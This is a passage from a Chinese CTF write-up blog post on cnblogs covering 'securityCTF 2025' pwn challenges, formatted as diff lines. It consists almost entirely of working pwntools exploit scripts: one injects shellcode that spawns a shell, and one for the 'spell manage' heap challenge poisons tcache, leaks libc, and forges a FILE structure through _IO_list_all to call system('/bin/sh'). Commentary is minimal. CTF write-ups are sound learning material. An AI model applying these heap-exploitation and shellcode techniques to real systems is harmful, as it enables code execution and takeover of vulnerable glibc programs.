+    shellcode += asm('pop rcx; push rsp; pop rsi') + asm('pop rcx') * 0x40 + asm('push rbx; pop rdx')
+    shellcode = shellcode.ljust(0x50f, asm('pop rcx'))
+    shellcode = b64encode(shellcode)
+
+    sla('Shellcode : ', shellcode)
+    # sleep(10)
+    shellcode = b'\x90'*0x220 + asm('add rsp, 0x800;' + shellcraft.sh())
+    s(shellcode)
+    # p.recv(1, timeout=2)
+    # shellcode = b'\x90'*0x520 + asm('add rsp, 0x800;') + asm(shellcraft.write(1, 'rsp', 0x100))
+    # sleep(0.5)
+    # sl(shellcode)
+    # p.interactive()
+    # p.recv(1)
+pwn()
+p.interactive()
+</code></pre>
+<p>记得控制rdx不要太大</p>
+<h1 id="spell-manage">spell manage</h1>
+<p>简单的堆题，给了个任意申请</p>
+<pre><code class="language-python">from pwn import *
+filename = './main'
+libc = ELF("./libc.so.6")
+host= ''
+port= 0
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process(filename)
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process(filename)
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+go
+'''
+
+def add(idx, content):    
+    s = content.ljust(0x6c, b'\x00')
+    sla(': ', '1')
+    sla(': ', str(idx))
+    sa(': ', s[0:0x20])
+    sa(': ', s[0x20:0x60])
+    sla(':', str(u32(s[0x60:0x64])))
+    sla(':', str(u32(s[0x64:0x68])))
+    sla(':', str(u32(s[0x68:0x6c])))
+
+def edit(idx, content):
+    s = content.ljust(0x6c, b'\x00')
+    sla(': ', '2')
+    sla(': ', str(idx))
+    sa(': ', s[0:0x20])
+    sa(': ', s[0x20:0x60])
+    sla(':', str(u32(s[0x60:0x64])))
+    sla(':', str(u32(s[0x64:0x68])))
+    sla(':', str(u32(s[0x68:0x6c])))
+
+def show():
+    sla(':', '3')
+
+def free(idx):
+    sla(':', '4')
+    sla(':', str(idx))
+
+def pwn():
+    global p
+    p = getp()
+
+    for i in range(0, 7):
+        add(i, b'')
+        free(i)
+    show()
+    p.recvuntil('Slot 0:\n  Name:')
+    haddr = u64(p.recv(6)+b'\x00\x00')*0x10 + 0x90
+    tkey = haddr &gt;&gt; 12
+    add(8, b'')
+    add(9, b'')
+    for i in range(0, 11):
+        add(10 + i, b'')
+
+    free(8)
+    free(9)
+
+    edit(0, b'\x00'*0x58+p64(0x81)+p64(tkey))
+    edit(9, p64(tkey ^ (haddr + 0x60)))
+    add(8, b'')
+    add(9, b'\x00'*0x18 + p64(0x481))
+
+    free(1)
+    show()
+    p.recvuntil('Slot 1:\n  Name: ')
+    libcbase = u64(p.recv(6)+b'\x00\x00') - 0x203b20
+    for i in range(0, 5):
+        add(11 + i, b'')
+
+    add(12, p64(tkey ^ (libcbase+libc.sym['_IO_list_all'])))
+
+    fake_io = haddr + 0x390
+    IO_wfile_jumps=libcbase+libc.sym['_IO_wfile_jumps']
+    setcontext_61=libcbase+libc.sym['setcontext']+61
+    rdi=libcbase+0x000000000010f75b
+    rax=libcbase+0x00000000000dd237
+    rsi=libcbase+0x0000000000110a4d
+    sys_ret=libcbase+0x000000000098FC5
+    ret=libcbase+0x000000000010f75b+1
+    saddr=libcbase+libc.sym['system']
+    binsh=libcbase+libc.search('/bin/sh').__next__()
+    Rop=p64(rdi)+p64(binsh)+p64(saddr)
+    orw=p64(setcontext_61)+p64(rdi)+p64(0xFFFFFF9C)
+    # 0x0    rdi             0x8   _IO_read_ptr
+    # 0x10  _IO_read_end     0x18  _IO_read_base
+    # 0x20  _IO_write_base   0x28  _IO_write_ptr
+    # 0x30  _IO_write_end    0x38  _IO_buf_base
+    # 0x40  _IO_buf_end      0x48  _IO_save_base
+    # 0x50  _IO_backup_base  0x58  _IO_save_end
+    # 0x60  _markers         0x68  _chain
+    # 0x70  _fileno          0x74  _flags2
+    # 0x78  _old_offset      0x80  _cur_column
+    # 0x82  _vtable_offset   0x83  _shortbuf
+    # 0x88  _lock            0x90  _offset
+    # 0x98  _codecvt         0xa0  _wide_data
+    # 0xa8  _freeres_list    0xb0  _freeres_buf
+    # 0xb8  __pad5           0xc0  _mode
+    # 0xc4  _unused2         0xd8  vtable
+    # magic:0x176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]
+    
+    pay=flat(
+    {
+    0x0:[b'/bin/sh\x00'],     # rdi = binsh
+    0x20:[p64(0)],            # write_base
+    0x28:[p64(1)],            # write_ptr --&gt; ptr &gt; base
+    0x48:[p64(saddr)],
+    0xc0:[p64(0)],            # _mode &lt;= 0
+    0xd8:[p64(IO_wfile_jumps+0x30)],
+    
+    0x88:[p64(fake_io+0x90),p64(0),p64(1)],   # bypass lock
+    
+    0xA0:[p64(fake_io-0x10)],         # bypass check in wfile_seekoff
+    0x10:[p64(1)],
+    0x18:[p64(0)],
+    # (0xB0+0xd8):[p64(fake_io+0xB0+0xd8)], # fake wfile vtable
+    (0xc8):[p64(fake_io+0xd0-0x18)],   
+    (0xd0):[p64(fake_io+0x30)],   # call entry
+    }, filler=b'\x00'
+    )
+
+    add(12, bytes(pay)[0:0x68])
+    add(13, bytes(pay)[0x80:0xe0])
+
+    sla(':', '5')
+    sla(':', str(0x78))
+    sla(':', p64(0))
+    sla(':', '5')
+    sla(':', str(0x78))
+    sla(':', p64(fake_io))
+
+    print(hex(libcbase))
+    print(hex(haddr))
+
+
+
+pwn()
+p.interactive()
+</code></pre>
+<p>改_IO_list_all结束</p>
+
+
+</div>
+<div class="clear"></div>
+<div id="blog_post_info_block" role="contentinfo" class="post-meta-container">
+    <div id="blog_post_info"></div>
+    <div class="clear"></div>
+    <div id="post_next_prev"></div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2025-10-11 21:17">2025-10-11 21:16</span>&nbsp;
+<a href="https://www.cnblogs.com/undefined">imiab</a>&nbsp;
+阅读(<span id="post_view_count">300</span>)&nbsp;
+评论(<span id="post_comment_count">1</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(19135998);return false;">收藏</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fundefined%2Fp%2F19135998&targetId=19135998&targetType=0" target="_blank">举报</a>
+</div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+<script>
+    var cb_entryId = 19135998, cb_entryCreatedDate = '2025-10-11 21:16', cb_postType = 1, cb_postTitle = 'securityCTF 2025 pwn方向题解';
+    var allowComments = true, cb_blogId = 841504, cb_blogApp = 'undefined', cb_blogUserGuid = '8a0895b2-d2a5-4d98-c91d-08dd08913576';
+    mermaidRender.render()
+    markdown_highlight()
+    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");    
+</script>
+<a id="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav">
+        <div class="comment-nav-right">
+            <span id="span_refresh_tips"></span><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a>
+        </div>
+    </div>
+    <div id="comment_form_container"></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+        <div id="cnblogs_ch"></div>
+    <div id="opt_under_post"></div>
+        <div id="blog_c1" class="under-post-card below-post-card">
+            <a href="https://www.doubao.com/download/desktop?ug_apk_token=FxCjd" rel="nofollow" target="_blank" onclick="countCreativeClicks('C1-字节-豆包')">
+                <img src="https://img2024.cnblogs.com/blog/35695/202609/35695-20260905201441417-1701437871.webp" onload="countCreativeImpressions('C1-字节-豆包')" alt="" style="width:300px!important;height:250px!important;min-width:300px!important;max-width:300px!important;" />
+                <span id="c1_impression" style="display:none"></span>
+            </a>
+        </div>
+    <div id="under_post_card1"></div>
+    <div id="related_posts_card"></div>
+    <div id="under_post_card2"></div>
+    <div id="HistoryToday" class="under-post-card below-post-card"></div>
+    <script type="text/javascript">
+        var commentManager = new blogCommentManager();
+        commentManager.renderComments(0);
+        fixPostBody();
+        window.footnoteTipManager.generateFootnoteTips();
+
+            window.tocManager.displayDisableTocTips = false;
+            window.tocManager.generateToc();
+            
+            setTimeout(function() { countViews(cb_blogId, cb_entryId); }, 50);
+            
+            deliverT2();
+            deliverC1C2();
+            loadNewsAndKb();
+            
+            LoadPostCategoriesTags(cb_blogId, cb_entryId);
+            
+            LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+            GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+            loadOptUnderPost();
+            GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+                </script>
+</div>
+
+	</div>
+	</div>
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div>
+					<script>loadBlogSideColumn()</script>
+			</div>			
+		</div>
+	</div>
+	<div class="clear"></div>
+	</div>
+	<div class="clear"></div>
+	<div id="footer">
+		<a href="https://www.cnblogs.com/" id="footer_site_link" class="footer-brand">博客园</a>
+<span class="footer-copyright"> &nbsp;&copy;&nbsp; 2004-2026</span>
+<br /><span class="footer-icp">
+    <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602011771"><img src="//assets.cnblogs.com/images/ghs.png" />浙公网安备 33010602011771号</a>
+    <a href="https://beian.miit.gov.cn" target="_blank">浙ICP备2021040463号-3</a>
+</span>
+
+
+
+	</div>
+</div>
+
+
+
+    <div id="page_end_html">
+        <script src="https://cdn.cnblogs.com/awescnb/index.js"></script>
+<script>
+  const opts = {
+    bodyBackground: {
+        enable: true,
+        value:'https://images.cnblogs.com/cnblogs_com/blogs/841504/galleries/2448994/o_250312133253_meiying.jpg',
+        opacity: 0.85,
+        repeat: true,
+    },
+    theme: {
+      name: 'geek',
+      avatar:'https://images.cnblogs.com/cnblogs_com/blogs/841504/galleries/2448994/o_250312125116_QQ%E5%9B%BE%E7%89%8720240807015716.jpg',
+    },
+    darkMode: {
+        enable: true,
+        darkDefault: false,
+    },
+  signature: {
+      enable: false,
+      contents: [
+      "",
+      ],
+    },
+  }
+  $.awesCnb(opts)
+</script>
+    </div>
+
+    <input type="hidden" id="antiforgery_token" value="CfDJ8Ow5-In01nBEvFwaadRGjqHbKfyopWytuytsJ0_KRzpnh2E_FDk7b8s_nwwJfbK_8T0o6hf3BSFUvjLjcw7wyT_SdFxd0YVB7A4BBYSmC86Dd5q4NWd5Ipine9F2ERqGZ57Vqr2RdLhB7XOBFYvk-FQ" />
+    <script defer src="https://hm.baidu.com/hm.js?866c9be12d4a814454792b1fd0fed295"></script>
+<script defer src="https://lf1-cdn-tos.bytegoofy.com/goofy/ttzz/push.js?32d945448dd797af605da9156763de3dc11c9886368d0f917d6388e4fcf5542030632485602430134f60bc55ca391050b680e2741bf7233a8f1da9902314a3fa" id="ttzz"></script>
+</body>
+</html>
